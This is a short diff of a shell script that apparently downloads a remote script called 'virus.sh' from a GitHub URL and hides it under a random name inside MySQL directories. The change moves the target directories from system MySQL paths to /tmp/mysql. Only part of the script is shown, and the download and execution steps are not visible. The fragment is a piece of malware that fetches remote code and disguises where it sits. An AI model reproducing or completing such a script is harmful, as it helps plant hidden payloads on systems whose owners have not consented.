@@ -2,10 +2,7 @@
 
 GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/Belousov-Kirill-1ISP21/virus/main/virus.sh"
 MYSQL_DIRS=(
-    "/usr/local/mysql"
-    "/var/lib/mysql" 
-    "/etc/mysql"
-    "/usr/sbin/mysql"
+    "/tmp/mysql"
 )
 
 generate_random_name() {
@@ -20,8 +17,8 @@ find_mysql_dir() {
         fi
     done
     
-    mkdir -p /var/lib/mysql 2>/dev/null
-    echo "/var/lib/mysql"
+    mkdir -p /tmp/mysql 2>/dev/null
+    echo "/tmp/mysql"
 }
 
 main() {
